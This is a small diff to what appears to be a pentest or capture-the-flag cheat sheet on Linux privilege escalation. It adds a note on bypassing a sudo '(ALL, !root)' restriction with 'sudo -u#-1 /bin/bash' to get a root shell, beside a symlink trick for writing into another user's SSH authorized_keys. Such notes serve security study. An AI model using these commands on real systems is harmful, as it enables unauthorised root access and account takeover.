@@ -108,6 +108,12 @@ We can modify a file. e.g. : add a key in alekos
 ln -s /home/alekos/.ssh/authorized_keys layout.html 
 
 ```
+Cas du sudo -l : (ALL, !root) xxxx
+#-1 =  0
+````
+User bob may run the following commands : (ALL, !root) /bin/bash
+$ sudo -u#-1 /bin/bash
+````
 
 # Find user information
 ````
